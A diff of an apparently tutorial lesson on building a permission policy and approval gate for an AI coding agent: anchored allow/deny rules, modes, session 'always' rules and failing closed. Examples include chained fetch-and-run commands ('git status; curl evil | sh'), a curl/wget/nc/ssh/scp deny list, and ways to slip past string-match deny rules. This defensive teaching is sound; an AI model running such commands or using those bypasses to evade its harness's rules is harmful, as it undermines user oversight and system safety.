@@ -20,20 +20,24 @@
   · ✗ Denied bash (read-only mode)
 ```
 
+The approval question has a third answer now. The first `npm test` is answered `a`, "always this session", and `git status` gets a plain `y`. When you ask for the tests again, `npm test` runs with no question at all, because that `a` became a rule. Then `/permissions` switches the session to read-only, and the request to delete `build/` is refused before anyone is asked. The `✗ Denied` line is the policy speaking, not you.
+
 ## Why it matters
 
-A y/N prompt on every command is safe but tiring, and tired people press `y` without reading. That is exactly how harnesses get people hurt. Real harnesses (Claude Code, Codex CLI, Gemini CLI) all combine three things:
+Previously, on Day 19, the harness learned to resume a conversation. Since Day 12 every risky tool call has asked you first, and since Day 15 the question has come through the UI. That's safe, and in a long session it's exhausting.
+
+A y/N prompt on every command is safe but tiring, and tired people press `y` without reading. Picture the twentieth question of an afternoon, after nineteen harmless `npm test`s and `git status`es. The twentieth looks the same at a glance, and you answer it the same way. That is exactly how harnesses get people hurt. Real harnesses (Claude Code, Codex CLI, Gemini CLI) all combine three things:
 - **rules** that pre-approve the boring, safe things and block the dangerous ones;
 - **modes** for different levels of trust;
 - a **prompt** for everything in between.
 
-Today you build that. Every decision **fails closed**: when in doubt, the answer is no.
+The rules take the nineteen boring questions away, so the one that's left gets your attention. Today you build that. Every decision **fails closed**: when in doubt, the answer is no.
 
 ## Concepts
 
 ### 1. Policy first, human second
 
-**A policy answers before anyone is asked.** For every tool call, a `PermissionPolicy` returns one of three answers: `allow` (run it), `deny` (refuse, with a reason) or `ask` (let the human decide). Only `ask` reaches the prompt. The checks run in a fixed order, and the first one that applies wins:
+A policy answers before anyone is asked. For every tool call, a `PermissionPolicy` returns one of three answers: `allow` (run it), `deny` (refuse, with a reason) or `ask` (let the human decide). Only `ask` reaches the prompt. The checks run in a fixed order, and the first one that applies wins:
 
 ```mermaid
 flowchart LR
@@ -52,7 +56,7 @@ flowchart LR
   ASK -- yes --> P[y / N / a prompt]
 ```
 
-Some calls walked through the flowchart, with `allow: ['bash(npm test*)', 'bash(git status)']` and `deny: ['bash(*curl*)', 'write(.git/*)']` (results from the reference policy):
+Read it left to right. The refusals come first, so nothing later in the chain can overrule them. Then come the cheap cases that need no human, and the question is the last resort. Here are some calls walked through the flowchart, with `allow: ['bash(npm test*)', 'bash(git status)']` and `deny: ['bash(*curl*)', 'write(.git/*)']` (results from the reference policy):
 
 | Call | Decision | Why |
 |---|---|---|
@@ -62,13 +66,37 @@ Some calls walked through the flowchart, with `allow: ['bash(npm test*)', 'bash(
 | `bash ls` | ask | no rule covers it |
 | `write ./.git/config` | deny | `write(.git/*)`, after the path is normalized (concept 2) |
 
-**Deny rules always win, even in `yolo`.** A deny like `bash(*curl*)` stops *accidents* and the obvious case. It is **not** an adversary-proof filter: `c\url`, `"cu"rl`, a `$(…)` subshell or plain `wget` all slip past a string match. The real defence is the approval prompt and not running untrusted input unattended (Day 27). Treat deny rules as guard-rails, not a sandbox.
+**Deny rules always win, even in `yolo`.** That's what putting them first in the chain means. But be clear about what a deny rule is. A deny like `bash(*curl*)` stops *accidents* and the obvious case. It is **not** an adversary-proof filter: `c\url`, `"cu"rl`, a `$(…)` subshell or plain `wget` all slip past a string match. The real defence is the approval prompt and not running untrusted input unattended (Day 27). Treat deny rules as guard-rails, not a sandbox.
+
+Every decision in that table came from matching a rule against a call, so rules are next.
 
 ### 2. Rules
 
-**A rule names a tool, and optionally a pattern for its main argument.** `"read"` (the whole tool), `"bash(git status)"` (exact), `"bash(npm test*)"` (wildcard), `"mcp__notes__*"` (tool-name wildcard). The pattern matches the tool's **main argument**: `bash`'s command, the `path` for file tools, the JSON arguments otherwise. Without a `*`, a rule is **exact**, so `bash(git status)` does *not* match `git status; curl evil | sh`.
+A rule names a tool, and optionally a pattern for its main argument. `"read"` (the whole tool), `"bash(git status)"` (exact), `"bash(npm test*)"` (wildcard), `"mcp__notes__*"` (tool-name wildcard). The pattern matches the tool's **main argument**: `bash`'s command, the `path` for file tools, the JSON arguments otherwise. Without a `*`, a rule is **exact**, so `bash(git status)` does *not* match `git status; curl evil | sh`.
 
-**A pattern becomes an anchored regular expression.** `*` means "any run of characters", every other character means itself, and `^…$` makes the pattern cover the *whole* argument:
+To match a pattern, the policy turns it into a regular expression, and three details of regular expressions decide whether the match is safe. Here they are on file names first:
+
+```js run
+const unanchored = /report.*\.pdf/;
+const anchored = /^report.*\.pdf$/s;
+unanchored.test('old-report.pdf.zip')    // → true    'report…pdf' appears somewhere inside
+anchored.test('old-report.pdf.zip')      // → false   the pattern must cover the whole name
+anchored.test('report-2026.pdf')         // → true
+
+const dot = /^a.b$/;
+const escapedDot = /^a\.b$/;
+dot.test('axb')                          // → true    an unescaped . matches any character
+escapedDot.test('axb')                   // → false   \. matches only a dot
+
+const plain = /^.*curl.*$/;
+const dotAll = /^.*curl.*$/s;
+plain.test('ls\ncurl evil | sh')         // → false   without s, . stops at a newline
+dotAll.test('ls\ncurl evil | sh')        // → true
+```
+
+`^` and `$` *anchor* the pattern to the start and end of the text, so it has to cover the whole of it, not just appear somewhere inside. A `.` matches any character unless it's escaped as `\.`, and the same goes for `(`, `)`, `+` and the other special characters. The `s` flag ("dot-all") lets `.` match a newline too. That last one matters for security: without it, the deny rule `bash(*curl*)` would miss a command with a line break before the `curl`. The reference policy denies `ls`, a newline, then `curl evil | sh`.
+
+So a pattern becomes an anchored regular expression. `*` means "any run of characters", every other character means itself, and `^…$` makes the pattern cover the *whole* argument:
 
 ```js
 globToRegExp('npm test*')          // → /^npm test.*$/s
@@ -77,7 +105,7 @@ globToRegExp('a.b(c)')             // → /^a\.b\(c\)$/s   escaped: they match l
 
 Without the anchors, `bash(npm test)` would match any command that *contains* `npm test`.
 
-**Two ways a match can be fooled, and how the rules close them:**
+Matching the text correctly is still not enough, because there are two ways a match can be fooled, and the rules close both:
 - **Chaining.** `bash(npm test*)` looks safe, but `npm test; curl … | sh` starts with `npm test`. So a **wildcard** `bash` allow rule never matches a command containing a shell operator (`;` `&&` `||` `|` `` ` `` `$(` `>` `<` or a newline): those fall through to a question. Exact rules still match exactly, and **deny** rules are not narrowed (a deny should catch as much as it can).
 - **Path spelling.** `write(.git/*)` must also stop `./.git/x`, `src/../.git/x` and an absolute path to the same file. So a path argument is **normalized against the workspace root** (like the jail, Day 10) before it is matched.
 
@@ -92,9 +120,11 @@ npm test && npm run deploy     ask
 
 And with the workspace at `/work/app`, the paths `./.git/config`, `src/../.git/config` and `/work/app/.git/config` all normalize to `.git/config` before matching, so `write(.git/*)` denies every one of them.
 
+Notice the asymmetry. Allow rules are narrowed, because a false "allow" runs something nobody approved. Deny rules aren't, because a false "deny" only costs a question. Rules decide individual calls, and for everything they don't decide, there's the mode.
+
 ### 3. Modes
 
-**A mode sets the default for everything the rules don't decide.** Pick it once, for how much you trust the situation:
+A mode sets the default for everything the rules don't decide. Pick it once, for how much you trust the situation:
 
 | Mode | needsApproval tools | other tools |
 |---|---|---|
@@ -117,15 +147,17 @@ yolo            allow    allow    allow     deny
 
 The last column is the same everywhere: that's "deny always wins".
 
+When the policy says `ask`, someone has to be asked. That's where the event bus comes back in, and where it needs help.
+
 ### 4. Request/response over a fire-and-forget bus
 
-**The gate needs an answer, and the bus can't carry one.** Day 14's `emit` can't return an answer, so the gate builds request/response on top of it:
+The gate needs an answer, and the bus can't carry one. Day 14's `emit` is synchronous and fire-and-forget: it calls each listener, ignores what they return, and has finished before any of them could have asked you anything. And the answer arrives much later, whenever you press a key. So `emit` can't return an answer, and the gate builds request/response on top of it:
 
 1. It emits `tool_approval_request { id, name, arguments }`, stores the promise's resolver in `pending: Map<id, resolver>`, and waits.
 2. The UI asks the question and emits `tool_approval_result { id, approved, remember? }`.
 3. The gate's listener looks up the resolver for that `id` and calls it.
 
-A *resolver* is the `resolve` function of a promise, kept for later: whoever calls it, whenever they do, settles that promise. The core of the pattern is a few lines:
+A *resolver* is the `resolve` function of a promise, kept for later: whoever calls it, whenever they do, settles that promise. You met the trick on Day 15, where `whenIdle()` kept its waiters' `resolve` functions in a list. Here they're kept in a `Map` by id, because several questions can be open at once. The core of the pattern is a few lines:
 
 ```js
 const pending = new Map();                                    // id → resolve function
@@ -141,21 +173,80 @@ function askHuman(call) {
 
 The `id` is what makes this safe: two questions can be outstanding, and each answer finds its own promise.
 
-Each pending promise resolves **exactly once**, on one of four paths:
+A question can also go unanswered, though. Each pending promise resolves **exactly once**, on one of four paths:
 - **answer** from the UI;
 - **timeout** after 120 s → deny;
 - **abort** (Ctrl+C) → deny;
 - **non-interactive** → deny immediately, with no question asked.
 
-On timeout and abort, the gate itself emits `tool_approval_result { approved: false }`, so the UI closes its open question. `finally`-style cleanup removes the map entry, the timer and the abort listener.
+Here is the full pattern with a general example, a help desk where each question has a ticket number. One question is answered, one is answered too late, and one customer gives up and leaves:
+
+```js run
+const listeners = [];                                  // a tiny bus: emit never waits
+const emit = (payload) => { for (const fn of listeners) fn(payload); };
+const pending = new Map();                             // ticket id → finish function
+
+listeners.push(({ id, text }) => {
+  const finish = pending.get(id);
+  if (finish) finish(text);
+  else console.log(`   (${id}: a late answer, and nobody is waiting for it)`);
+});
+
+function ask(id, question, { timeoutMs, signal }) {
+  return new Promise((resolve) => {
+    let settled = false;
+    const finish = (text) => {
+      if (settled) return;                             // the first exit wins; the rest do nothing
+      settled = true;
+      pending.delete(id);
+      clearTimeout(timer);
+      signal?.removeEventListener('abort', onAbort);
+      resolve(text);
+    };
+    const timer = setTimeout(() => finish('(no answer in time)'), timeoutMs);
+    const onAbort = () => finish('(the customer left)');
+    signal?.addEventListener('abort', onAbort, { once: true });
+    pending.set(id, finish);
+    console.log(`${id} asks: ${question}`);
+  });
+}
+
+const leaving = new AbortController();
+const answers = [
+  ask('t1', 'Is the kitchen open?', { timeoutMs: 50 }),
+  ask('t2', 'Is there parking?', { timeoutMs: 50 }),
+  ask('t3', 'Do you take cards?', { timeoutMs: 50, signal: leaving.signal }),
+];
+setTimeout(() => emit({ id: 't1', text: 'until 10 pm' }), 10);   // answered
+setTimeout(() => leaving.abort(), 20);                           // t3 gives up
+setTimeout(() => emit({ id: 't2', text: 'out back' }), 80);      // t2 answered too late
+
+for (const [i, answer] of (await Promise.all(answers)).entries()) console.log(`t${i + 1} → ${answer}`);
+await new Promise((resolve) => setTimeout(resolve, 60));
+// → t1 asks: Is the kitchen open?
+// → t2 asks: Is there parking?
+// → t3 asks: Do you take cards?
+// → t1 → until 10 pm
+// → t2 → (no answer in time)
+// → t3 → (the customer left)
+// →    (t2: a late answer, and nobody is waiting for it)
+```
+
+Follow the times. All three questions are asked at once, and nothing blocks while they wait: each `ask` returns a pending promise straight away. At 10 ms t1's answer arrives, finds t1's `finish` in the map, and settles it. At 20 ms the abort settles t3. At 50 ms t2's timer fires, and t2 settles as unanswered. When t2's real answer turns up at 80 ms, `finish` has already deleted t2 from the map, so the answer finds nobody and changes nothing.
+
+You might wonder why `finish` needs its `settled` flag, since a promise can only settle once anyway (Day 3): a second `resolve` call is ignored. The flag isn't there for `resolve`. It's there for everything else `finish` does: clearing the timer, removing the abort listener, deleting the map entry and, in the gate, the announcement below must each happen once. The cleanup does remove the other exits (no timer can fire after an answer, because the answer cleared it), but four callers share `finish`, and one check at its top makes "exactly once" true by construction instead of relying on every other exit having been removed in time.
+
+On timeout and abort, the gate itself emits `tool_approval_result { approved: false }`, so the UI closes its open question. `finally`-style cleanup removes the map entry, the timer and the abort listener. The order inside the gate's `finish` matters here: it deletes the map entry *before* it announces, because the announcement goes through the bus to every listener, the gate's own included. By then there's nothing left for the gate to find.
 
 What the model then reads: a timeout gives `User denied bash (no answer within 120 s)`. Nobody answered, so it counts as the user's "no", like Ctrl+C. A non-interactive refusal is the policy's, so it reads `Denied bash (needs approval but nobody can answer (non-interactive) — use --auto-approve or an allow rule)`.
 
-C programmers: this is a per-id condition variable. Python: one `asyncio.Future` per id.
+C programmers: this is a per-id condition variable. Python: one `asyncio.Future` per id. They differ from JavaScript on a second answer, though. Calling `set_result` on a Python future that's already done raises `InvalidStateError`, and a C++ `std::promise` throws `std::future_error` if you set its value twice. A JavaScript `resolve` called twice says nothing at all, so a doubled answer never shows up as an error. That's one more reason the gate's cleanup is guarded by its own flag instead of relying on anything to complain.
+
+One answer the UI can give is more than a yes, and it needs a careful definition.
 
 ### 5. "Always" means this session, exactly
 
-**`a` adds the narrowest rule that covers this call.** Answering `a` adds a **session rule**, scoped as narrowly as the call allows: the exact command for `bash` (`bash(npm test)`), the exact **path** for `write`/`edit` (`write(src/app.js)`, so "always" means *this file*, not every file), the tool name for anything else. The prompt says what it will cover (`↳ always allowing write to this path this session`). It is never written to disk; persistent rules belong in *your* global settings (Day 26), never in a repo.
+`a` adds the narrowest rule that covers this call. Answering `a` adds a **session rule**, scoped as narrowly as the call allows: the exact command for `bash` (`bash(npm test)`), the exact **path** for `write`/`edit` (`write(src/app.js)`, so "always" means *this file*, not every file), the tool name for anything else. The prompt says what it will cover (`↳ always allowing write to this path this session`). It is never written to disk; persistent rules belong in *your* global settings (Day 26), never in a repo.
 
 | Call | Session rule added | The prompt says it covers |
 |---|---|---|
@@ -165,9 +256,15 @@ C programmers: this is a per-id condition variable. Python: one `asyncio.Future`
 
 Note the rule for `bash` has no `*`. "Always" for `npm test` doesn't quietly become "always for anything starting with `npm test`".
 
+The reason for all this narrowness is that you're approving what you see. When you answer `a` to `npm test`, you've read `npm test`, and that's all the rule should ever let through. This is the principle of least privilege: grant exactly what was asked for, and nothing it might be stretched to cover.
+
+The last case is the one with nobody to see anything.
+
 ### 6. Fail closed in non-interactive mode
 
-**When nobody can answer, the answer is no.** `-p` (Day 26) and evals (Day 29) have nobody to ask, so `ask` becomes **deny**, with a reason that tells you how to opt in (`--auto-approve` or an allow rule). It's tempting to auto-approve in print mode "because hanging is worse". Mainstream harnesses do the opposite: a script that silently runs whatever the model wants is how a headless agent does damage.
+When nobody can answer, the answer is no. `-p` (Day 26) and evals (Day 29) have nobody to ask, so `ask` becomes **deny**, with a reason that tells you how to opt in (`--auto-approve` or an allow rule). It's tempting to auto-approve in print mode "because hanging is worse". Mainstream harnesses do the opposite: a script that silently runs whatever the model wants is how a headless agent does damage.
+
+The denial isn't a dead end, either. The model reads the reason like any other tool result, and you read the same reason in the output, which says exactly which setting would let the call through.
 
 ## Build
 
@@ -194,6 +291,8 @@ Hint for `globToRegExp`: split on `*`, regex-escape each piece, join with `.*`, 
 
 `decide` is concept 1's flowchart as a list of `if`s, where the first that applies returns: a deny rule; read-only and not `readOnly`; no approval needed; an allow or session rule (skipping wildcard `bash` rules for chained commands); `yolo`; `accept-edits` for `write`/`edit`; otherwise `ask`. Validating rules in the constructor turns a typo in your settings into an error at startup, not a rule that silently never matches.
 
+The policy is pure: it takes a call and returns a decision, with no bus, no UI and no waiting. That's why it comes first, and why most of its tests are one line each. Everything asynchronous lives in the gate.
+
 ### 20.2 `src/agent/approval-gate.js` — Core
 
 ```js
@@ -208,12 +307,16 @@ The question shows the **whole** request, however long. Never shorten what someo
 
 Inside `approve`, all four exits go through one small `finish(result)` function guarded by a `settled` flag. `finish` deletes the map entry, clears the timer and removes the abort listener, then resolves. The timeout and the abort also announce `tool_approval_result { approved: false }` before resolving, so the UI's open question closes.
 
+The two halves mirror each other. The gate keeps a map of promises waiting for answers, and the prompt keeps a map of questions waiting to be answered. When the gate gives up first, its announcement makes the prompt abort its `ui.ask`, and without that, the next line you type would be taken as the answer to a question nobody is waiting for any more.
+
 ### 20.3 Wire it — Core
 
 - `AgentLoop` gets `gateAllTools`: when it is true, *every* call goes through `approve`, so read-only mode and deny rules cover tools that never ask.
 - `createApp({ permissions: { mode, allow, deny }, interactive = true, approvalTimeoutMs = 120_000 })` builds a `PermissionPolicy`, then `createApprovalGate`, then (if interactive) `attachApprovalPrompt`, and passes `approve: gate.approve, gateAllTools: true` to the loop. Day 15's inline y/N approver goes away.
 - Wording: a human "no", a timeout or an abort gives `User denied <name>`; a policy refusal gives `Denied <name> (<reason>)`. The gate marks its own refusals (deny rules, modes, non-interactive) with `by: 'policy'`, and the loop picks the wording from that field (Day 12), never from the reason's text.
 - Add `/permissions [mode <m> | allow <rule> | deny <rule>]`, which shows or changes the policy for this session.
+
+The loop doesn't change shape. Since Day 12 it has called one `approve(call, tool, { signal })` function and read `{ approved, reason?, by? }` back, so the gate slots in where Day 15's three-line prompt was.
 
 ### 20.4 Course tests — Core
 
@@ -235,6 +338,12 @@ Approve once with `y`, once with `a` (check that it doesn't ask again), and deny
 Add a `network: false` setting that makes the policy deny any `bash` command containing `curl`, `wget`, `nc`, `ssh` or `scp`. Then write down why this is **weak**: `python -c "import urllib…"` gets around it. Real network isolation needs an OS sandbox (Day 11 stretch, and the post-course track).
 
 ## Check
+
+The harness now decides most approvals itself, and asks you only about what's left. A policy runs in a fixed order, deny rules first, so nothing can overrule a refusal. Rules match whole, anchored arguments, wildcard allow rules refuse chained commands, and paths are normalized before matching. Modes set the default for everything else. When a human is needed, the gate asks over the bus with a stored resolver per id, and every question ends exactly once, by answer, timeout, abort or "nobody can answer", always failing closed. "Always" grants exactly the call you saw, for this session only.
+
+Tomorrow, [Day 21](day-21.md) tests the seam you've relied on since Day 8 by adding a second provider. It also brings the hard case of streamed tool calls that Day 16's assembler was built for: arguments cut into JSON fragments.
+
+Before you move on, check:
 
 - [ ] `node --test tests/course/day20-*` green (18 tests)
 - [ ] Live: y, a (no second question), N, read-only denial
@@ -272,12 +381,12 @@ A rule's pattern goes in parentheses after the tool name: `bash(git status)`. Wi
 
 ## Common mistakes
 
-- Treating allow as stronger than deny.
-- A wildcard allow rule (`bash(git *)`) that silently pre-approves `git status; curl … | sh`.
-- Matching a path rule against the raw argument, so `./x` or `a/../x` slips past `deny(x)`.
-- Trusting a deny rule as a sandbox: it stops accidents, not a determined command.
-- Making "always" a prefix match, scoping a write "always" to every file, or saving it to disk.
-- Auto-approving in non-interactive mode.
+- Treating allow as stronger than deny. Checking allow rules first feels natural, because they're the ones you write most, but then one broad allow quietly overrules every deny.
+- A wildcard allow rule (`bash(git *)`) that silently pre-approves `git status; curl … | sh`. The rule reads as "git commands", but a string match only sees that the text starts with `git `.
+- Matching a path rule against the raw argument, so `./x` or `a/../x` slips past `deny(x)`. Your own tests use clean paths, and only a model or an attacker spells them oddly.
+- Trusting a deny rule as a sandbox: it stops accidents, not a determined command. It's easy to read `deny: ['bash(*curl*)']` as "no network", when it only means "no text `curl`".
+- Making "always" a prefix match, scoping a write "always" to every file, or saving it to disk. Each one feels like a convenience, and each one grants more than the call you actually read.
+- Auto-approving in non-interactive mode. A script that hangs on a question looks like a bug to fix, and auto-approving is the quickest fix, but it trades a visible hang for silent risk.
 
 ## Self-check
 
